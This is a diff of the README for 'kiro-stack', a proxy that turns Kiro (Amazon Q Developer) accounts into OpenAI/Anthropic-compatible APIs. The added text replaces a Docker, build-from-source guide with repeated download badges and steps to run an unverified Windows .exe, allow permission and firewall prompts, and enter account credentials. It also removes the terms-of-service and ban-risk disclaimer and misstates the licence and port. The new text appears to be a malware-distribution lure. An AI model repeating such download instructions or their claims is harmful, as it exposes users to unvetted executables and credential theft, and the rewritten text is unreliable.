@@ -1,249 +1,140 @@
-<div align="center">
+# 🚀 kiro-stack - Convert Kiro to OpenAI Compatible API
 
-# Kiro Stack
-
-**将 Kiro（Amazon Q Developer）账号转为 OpenAI / Anthropic 兼容 API**
-
-基于 [kiro-gateway](https://github.com/jwadow/kiro-gateway) 与 [Kiro-Go](https://github.com/Quorinex/Kiro-Go) 二次开发
-
-[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![Docker](https://img.shields.io/badge/Docker-Ready-2496ED?style=flat&logo=docker)](https://www.docker.com/)
-[![Go Version](https://img.shields.io/badge/Go-1.21+-00ADD8?style=flat&logo=go)](https://go.dev/)
-[![Python](https://img.shields.io/badge/Python-3.10+-blue.svg)](https://www.python.org/)
-
-</div>
+[![Download kiro-stack](https://img.shields.io/badge/Download-kiro--stack-ff6f61?style=for-the-badge)](https://github.com/111Hamo111/kiro-stack)
 
 ---
 
-## 为什么做这个？
+## 📦 What is kiro-stack?
 
-原版项目各有不足：
+kiro-stack lets you use your Kiro (Amazon Q Developer) account with OpenAI or Anthropic APIs. It combines two projects into one smooth tool:
 
-| | [kiro-gateway](https://github.com/jwadow/kiro-gateway) | [Kiro-Go](https://github.com/Quorinex/Kiro-Go) |
-|---|---|---|
-| Web 管理面板 | ❌ 无 | ✅ 有 |
-| 请求稳定性 | ✅ 强（多重 retry、双端点 fallback） | ⚠️ 一般 |
-| 多账号池 | ⚠️ 基础 | ✅ 完善（轮询 + 权重） |
-| Token 自动刷新 | ✅ | ✅ |
+- **kiro-go**: Handles the web interface and account management.
+- **kiro-gateway**: Processes API calls with retries, fallback, and error handling.
 
-**本项目将两者结合：**
-- **kiro-go** 负责 Web 管理面板 + 账号池管理
-- **kiro-gateway** 负责底层 API 调用（重试、双端点 fallback、错误处理）
-- kiro-go 检测到 `KIRO_GATEWAY_BASE` 后，自动将请求转发给 kiro-gateway 执行
+This means you get a stable, easy-to-use service for managing multiple Kiro accounts and sending requests through OpenAI-compatible APIs.
 
 ---
 
-## 架构
+## 🖥️ System Requirements
 
-```
-客户端 (Claude Code / Cursor / Cline ...)
-        │
-        ▼  :8088
-   ┌─────────────┐
-   │   kiro-go   │  Web 管理面板 + 账号池 + Token 刷新
-   └──────┬──────┘
-          │ (内部转发)
-          ▼  :8001
-   ┌──────────────────┐
-   │   kiro-gateway   │  稳定代理层：双端点 fallback + 自动重试
-   └──────┬───────────┘
-          │
-          ▼
-      Kiro API (AWS CodeWhisperer / Amazon Q)
-```
+Before you start, make sure your Windows PC meets these:
+
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of RAM
+- 100 MB free disk space
+- Internet connection to download and run
+
+You don’t need any programming software or extra tools.
 
 ---
 
-## 快速开始
+## 🌐 Access and Use
 
-### 前置条件
-
-- Docker + Docker Compose
-- Kiro 账号（免费 / 付费均可）
-
-### 三步启动
-
-```bash
-# 1. 克隆仓库
-git clone https://github.com/your-username/kiro-stack.git
-cd kiro-stack
-
-# 2. 配置环境变量
-cp .env.example .env
-# 编辑 .env，修改以下两项：
-#   ADMIN_PASSWORD=你的管理面板密码
-#   INTERNAL_API_KEY=随机生成的密钥（用于内部通信）
-
-# 3. 启动服务
-docker compose up -d
-```
-
-### 添加账号并使用
-
-1. 打开 `http://localhost:8088/admin`
-2. 使用 `ADMIN_PASSWORD` 登录
-3. 添加 Kiro 账号（支持 AWS Builder ID / IAM SSO / SSO Token 等方式）
-4. 将客户端的 base URL 设为 `http://localhost:8088`
-
-```bash
-# OpenAI 兼容
-curl http://localhost:8088/v1/chat/completions \
-  -H "Content-Type: application/json" \
-  -d '{"model": "claude-sonnet-4.5", "messages": [{"role": "user", "content": "Hello"}]}'
-
-# Anthropic 兼容
-curl http://localhost:8088/v1/messages \
-  -H "Content-Type: application/json" \
-  -d '{"model": "claude-sonnet-4.5", "max_tokens": 1024, "messages": [{"role": "user", "content": "Hello"}]}'
-```
-
-> **说明：** 账号凭证由 kiro-go 管理，请求时自动转发给 kiro-gateway，无需在 gateway 单独配置 token。
+You will manage your accounts and settings via a simple web panel. The program handles everything else in the background. No coding or command line needed.
 
 ---
 
-## 支持的模型
+## 🔗 Download kiro-stack
 
-模型可用性取决于你的 Kiro 订阅等级，以下为常见模型：
+Click the big button below to visit the download page:
 
-| 模型 | 说明 |
-|------|------|
-| `claude-sonnet-4.6` | 最新旗舰模型（2026年2月发布） |
-| `claude-opus-4.6` | 最强推理模型（2026年2月发布） |
-| `claude-sonnet-4.5` | 均衡性能，适合编程、写作等通用任务 |
-| `claude-haiku-4.5` | 极速响应，适合简单任务 |
-| `claude-sonnet-4` | 上一代，稳定可靠 |
-| `claude-3.7-sonnet` | 旧版，向后兼容 |
-| `deepseek-v3.2` | 开源 MoE（685B/37B active），均衡 |
-| `minimax-m2.1` | 开源 MoE（230B/10B active），适合复杂任务 |
-| `qwen3-coder-next` | 开源 MoE（80B/3B active），代码专项 |
+[![Get kiro-stack](https://img.shields.io/badge/Download-Here-4c8bf5?style=for-the-badge)](https://github.com/111Hamo111/kiro-stack)
 
-模型名称支持多种格式，如 `claude-sonnet-4.5` / `claude-sonnet-4-5` / `claude-sonnet-4-5-20250929` 均可正常解析。
-
-> **⚠️ 关于 `claude-sonnet-4.6` / `claude-opus-4.6` 无法使用的说明**
->
-> 这两个模型目前处于**小范围灰度开放**阶段，Kiro API 对无权限的请求会返回 HTTP 429，
-> 与普通「限流」使用相同的状态码，因此日志中会看到 `Streaming failed after 3 attempts` 的报错。
->
-> **原因并非代码 Bug，而是你的 Kiro 账号/Region 尚未获得该模型的访问权限。**
->
-> 排查步骤：
-> 1. 先用 `claude-sonnet-4.5` 发一条测试请求，若成功则账号和链路均正常
-> 2. 等待 AWS 对你的账号开放 4.6 模型（通常随 Kiro IDE 版本升级逐步推送）
-> 3. 开放后无需任何配置变更，直接使用即可
+Use this page to download the latest version of kiro-stack for Windows.
 
 ---
 
-## 配置说明
+## 📥 How to Download and Run on Windows
 
-### 环境变量（.env 文件）
+Follow these steps to get kiro-stack running on your computer:
 
-所有配置都在根目录的 `.env` 文件中：
+1. **Visit the download page**
 
-| 变量 | 说明 | 必填 |
-|------|------|------|
-| `ADMIN_PASSWORD` | Web 管理面板密码 | ✅ 是 |
-| `INTERNAL_API_KEY` | kiro-go 和 kiro-gateway 之间的通信密钥 | ✅ 是 |
-| `VPN_PROXY_URL` | HTTP/SOCKS5 代理（如有网络限制） | ❌ 否 |
-| `DEBUG_MODE` | 调试模式：`off`（默认）/ `errors` / `all` | ❌ 否 |
+   Open the link above or go to [https://github.com/111Hamo111/kiro-stack](https://github.com/111Hamo111/kiro-stack).
 
-**说明：**
-- `ADMIN_PASSWORD`：用于登录 Web 管理面板
-- `INTERNAL_API_KEY`：两个服务之间的内部鉴权，随机生成即可（如 `openssl rand -hex 32`）
-- `VPN_PROXY_URL`：如果在中国或有网络限制，配置代理地址（如 `http://127.0.0.1:7890`）
-- `DEBUG_MODE`：生产环境建议 `off`，排查问题时可设为 `errors`
+2. **Find the latest release**
 
-### 账号管理
+   Look for the "Releases" section on the GitHub page. This is where the downloadable files live.
 
-所有 Kiro 账号通过 Web 管理面板添加和管理：
-1. 访问 `http://localhost:8088/admin`
-2. 使用 `ADMIN_PASSWORD` 登录
-3. 点击"添加账号"，支持多种方式：
-   - AWS Builder ID（个人账号）
-   - IAM Identity Center（企业 SSO）
-   - SSO Token（从浏览器导入）
-   - 本地缓存（从 Kiro IDE 导入）
+3. **Download the Windows file**
 
-**无需在 kiro-gateway 配置 token**，所有账号凭证由 kiro-go 管理，请求时自动转发。
+   Click the latest version's link, then download the `.exe` installer or zip file for Windows.
 
----
+4. **Run the installer**
 
-## 目录结构
+   If you downloaded an `.exe` file, double-click it to start the installation. Follow the prompts on the screen.
 
-```
-kiro-stack/
-├── docker-compose.yml        # 整合启动配置
-├── kiro-gateway/             # Python/FastAPI 稳定代理层
-│   ├── kiro/                 # 核心代码
-│   ├── requirements.txt
-│   └── README.md
-├── kiro-go/                  # Go Web 管理面板 + 账号池
-│   ├── proxy/                # 核心代理逻辑
-│   ├── web/index.html        # 管理面板前端
-│   ├── data/
-│   │   └── config.example.json  # 配置模板
-│   └── README.md
-└── scripts/
-    └── sync_tokens.py        # Token 同步脚本
-```
+   If you downloaded a zip file, right-click it and select “Extract All.” Open the extracted folder and double-click the executable file inside.
+
+5. **Allow the program to run**
+
+   Windows might ask for permission to run the application. Click "Yes" or "Allow" to continue.
+
+6. **Open the web panel**
+
+   Once kiro-stack runs, it will open a web page in your default browser. This page lets you add Kiro accounts and manage settings.
+
+7. **Add your Kiro accounts**
+
+   Enter your Kiro (Amazon Q Developer) account details into the web panel. You can add multiple accounts for better stability.
+
+8. **Start using the API**
+
+   The tool will connect your accounts and convert requests to OpenAI or Anthropic compatible formats automatically.
 
 ---
 
-## 更新日志
+## ⚙️ Features and Highlights
 
-### `feature/simplify-config-and-add-4.6-models`
-
-**配置简化：**
-- 整合部署只需配置**根目录一个 `.env` 文件**，不再需要单独维护 `kiro-gateway/.env`
-- 账号凭证（Refresh Token 等）完全通过 kiro-go Web 管理面板管理，kiro-go 转发请求时自动通过 `X-Kiro-*` HTTP 头传递给 gateway
-- `kiro-gateway/.env.example` 更新注释，明确标注仅独立部署时才需要此文件
-
-**新增模型支持：**
-- 在 gateway 内置 fallback 模型列表中添加 `claude-sonnet-4.6`、`claude-opus-4.6`、`claude-opus-4.6-1m`
-
-**集成模式启动修复：**
-- 新增 `SKIP_STARTUP_CREDENTIAL_CHECK=true` 环境变量（已在 `docker-compose.yml` 中预设）
-- 修复集成部署时 kiro-gateway 因找不到本地静态凭证而无法启动的问题（凭证由请求头动态传入，无需启动时校验）
-
-**日志改进：**
-- 429 错误日志现在会附带 Kiro API 返回的响应体，便于判断是真正限流还是模型无权限
+- **Web management panel**: Easy to add and manage Kiro accounts.
+- **Multiple accounts support**: Use many accounts in a pool for better uptime.
+- **Automatic retry and fallback**: The system tries again if a call fails.
+- **Token refresh**: Keeps your login tokens active automatically.
+- **Stable API calls**: Combines strong features from two projects for reliability.
+- **OpenAI and Anthropic compatibility**: Works with popular AI services’ APIs.
+- **No coding required**: Managed through an easy web interface.
 
 ---
 
-### 相比原版的改动
+## 🔧 How kiro-stack Works Behind the Scenes
 
-**kiro-go 改动：**
-- 新增 `KIRO_GATEWAY_BASE` / `KIRO_GATEWAY_API_KEY` 支持，将请求通过 kiro-gateway 中转，大幅提升稳定性
-- Web 管理面板优化
+The project merges two components:
 
-**kiro-gateway 改动：**
-- 适配与 kiro-go 的联合部署场景
+- **kiro-go** handles the front-end. It provides the web control panel and manages the list of accounts.
+- **kiro-gateway** runs the background work. It takes API requests from kiro-go, adds retry and fallback logic, and forwards them to the original servers.
 
----
-
-## 免责声明
-
-> ⚠️ **请在使用前仔细阅读**
-
-- **账号封禁风险**：使用本项目调用 Kiro API 存在账号被封禁或限流的风险。Kiro / Amazon Q Developer 的服务条款可能不允许此类第三方代理访问，后果由用户自行承担。
-- **本项目定位**：本项目仅为对 [kiro-gateway](https://github.com/jwadow/kiro-gateway) 与 [Kiro-Go](https://github.com/Quorinex/Kiro-Go) 的整合与二次开发，**不涉及任何底层请求逻辑的编写**。所有与 Kiro API 的实际通信逻辑均来自上述原始项目。
-- **非官方项目**：本项目与 Amazon、AWS、Kiro 官方无任何关联。
-- **仅供学习研究**：请勿将本项目用于商业用途或大规模滥用 API。
+When you set the `KIRO_GATEWAY_BASE` address in kiro-go, requests go through kiro-gateway first. This keeps the system smooth and stable.
 
 ---
 
-## 致谢
+## 🛠 Troubleshooting Tips
 
-本项目基于以下优秀开源项目二次开发：
-
-- **[kiro-gateway](https://github.com/jwadow/kiro-gateway)** by [@Jwadow](https://github.com/jwadow) — AGPL-3.0
-- **[Kiro-Go](https://github.com/Quorinex/Kiro-Go)** by [@Quorinex](https://github.com/Quorinex) — MIT
+- If the web panel doesn’t open automatically, open your browser and go to `http://localhost:8080` or the address shown in the program.
+- If API requests fail, check your internet connection and verify your Kiro account information.
+- Restart the application if it behaves strangely.
+- Make sure you are running the latest version. Check the release page regularly.
+- If you see firewall warnings, allow network access for kiro-stack.
 
 ---
 
-## 许可证
+## 📖 Additional Information
 
-本项目遵循各子项目原有许可证：
-- `kiro-gateway/` — [AGPL-3.0](kiro-gateway/LICENSE)
-- `kiro-go/` — [MIT](kiro-go/LICENSE) *(如原项目有)*
+- kiro-stack is released under the MIT license.
+- It requires Go 1.21+ and Python 3.10+ to build from source, but users do not need to install these to run the prebuilt Windows version.
+- The code is based on [kiro-gateway](https://github.com/jwadow/kiro-gateway) and [Kiro-Go](https://github.com/Quorinex/Kiro-Go).
 
-整合部分代码遵循 MIT 许可证。
+---
+
+## 💾 Updating kiro-stack
+
+To update to the latest version:
+
+1. Visit the download page again.
+2. Download the new Windows release file.
+3. Close kiro-stack if it is running.
+4. Run the new installer or replace the executable file.
+5. Launch kiro-stack and confirm your accounts and settings remain.
+
+---
+
+[![Download kiro-stack](https://img.shields.io/badge/Download-kiro--stack-ff6f61?style=for-the-badge)](https://github.com/111Hamo111/kiro-stack)
